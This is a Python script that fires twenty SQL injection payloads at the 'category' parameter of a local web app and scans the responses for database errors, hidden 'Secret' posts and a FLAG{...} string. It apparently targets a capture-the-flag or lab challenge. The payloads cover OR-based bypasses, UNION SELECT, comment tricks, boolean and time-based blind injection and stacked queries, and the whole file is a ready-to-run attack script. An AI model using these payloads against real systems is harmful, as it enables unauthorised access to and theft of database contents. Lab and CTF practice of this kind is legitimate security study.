import requests
import re
from urllib.parse import quote, urlencode

BASE_URL = "http://127.0.0.1:32860/"

def test_sqli_payload(payload, description):
    """Test a single SQL injection payload"""
    print(f"\n{'='*80}")
    print(f"[TEST] {description}")
    print(f"[PAYLOAD] {payload}")
    print(f"{'='*80}")
    
    # Test with URL parameter
    url = f"{BASE_URL}?category={quote(payload)}"
    
    try:
        response = requests.get(url, timeout=10)
        
        print(f"[URL] {url}")
        print(f"[STATUS] {response.status_code}")
        print(f"[LENGTH] {len(response.content)} bytes")
        
        # Check for SQL errors
        sql_errors = [
            r"SQL syntax",
            r"mysql_fetch",
            r"SQLite",
            r"PostgreSQL",
            r"ORA-\d+",
            r"SQL Server",
            r"Microsoft OLE DB",
            r"Unclosed quotation mark",
            r"syntax error",
            r"SQLSTATE",
            r"sqlite3\.",
            r"DatabaseError"
        ]
        
        for error_pattern in sql_errors:
            if re.search(error_pattern, response.text, re.IGNORECASE):
                print(f"[!] SQL ERROR DETECTED: Pattern '{error_pattern}' found")
        
        # Count posts in response
        post_count = response.text.count('<article') or response.text.count('<div class="post')
        print(f"[POSTS] Detected {post_count} posts in response")
        
        # Look for Secret category mentions
        secret_matches = re.findall(r'(?i)secret', response.text)
        if secret_matches:
            print(f"[!] 'Secret' mentions found: {len(secret_matches)} times")
        
        # Look for FLAG pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flag_matches:
            print(f"[!] FLAG FOUND: {flag_matches}")
        
        # Print response body
        print(f"\n[RESPONSE BODY]")
        print(response.text)
        
        return response
        
    except requests.exceptions.Timeout:
        print(f"[ERROR] Request timed out")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None

# Test baseline - normal request
print("\n" + "="*80)
print("BASELINE TEST - Normal Request")
print("="*80)
baseline = test_sqli_payload("Technology", "Baseline - Normal category")

# Test 1: Basic SQLi with quote
test_sqli_payload("'", "Single quote test (syntax error detection)")

# Test 2: OR-based SQLi
test_sqli_payload("' OR '1'='1", "OR-based SQLi (classic bypass)")

# Test 3: OR with comment
test_sqli_payload("' OR '1'='1'--", "OR-based SQLi with comment")

# Test 4: OR with hash comment
test_sqli_payload("' OR '1'='1'#", "OR-based SQLi with hash comment")

# Test 5: UNION-based SQLi
test_sqli_payload("' UNION SELECT NULL--", "UNION SELECT with NULL")

# Test 6: UNION with multiple columns
test_sqli_payload("' UNION SELECT NULL,NULL,NULL--", "UNION SELECT with 3 NULLs")

# Test 7: Secret with OR bypass
test_sqli_payload("Secret' OR '1'='1", "Secret category with OR bypass")

# Test 8: Secret with comment
test_sqli_payload("Secret'--", "Secret category with comment")

# Test 9: Secret with hash comment
test_sqli_payload("Secret'#", "Secret category with hash comment")

# Test 10: Always true condition
test_sqli_payload("' OR 1=1--", "Always true condition")

# Test 11: UNION with string extraction
test_sqli_payload("' UNION SELECT 'injected',NULL,NULL--", "UNION with string injection")

# Test 12: Bypass using concatenation
test_sqli_payload("Secr'||'et", "Concatenation bypass")

# Test 13: Boolean-based blind SQLi
test_sqli_payload("Technology' AND '1'='1", "Boolean-based true condition")

# Test 14: Boolean-based blind SQLi (false)
test_sqli_payload("Technology' AND '1'='2", "Boolean-based false condition")

# Test 15: Space bypass with comment
test_sqli_payload("'/**/OR/**/1=1--", "Space bypass with comments")

# Test 16: Double quote test
test_sqli_payload('" OR "1"="1', "Double quote OR bypass")

# Test 17: Secret without quotes
test_sqli_payload("Secret OR 1=1", "Secret with OR (no quotes)")

# Test 18: Stacked queries test
test_sqli_payload("'; SELECT * FROM posts--", "Stacked query test")

# Test 19: Time-based blind SQLi
test_sqli_payload("' OR SLEEP(5)--", "Time-based SQLi (MySQL)")

# Test 20: Admin or privileged category
test_sqli_payload("' OR category='Secret'--", "Direct Secret category access")

print("\n" + "="*80)
print("SQL INJECTION TESTING COMPLETE")
print("="*80)

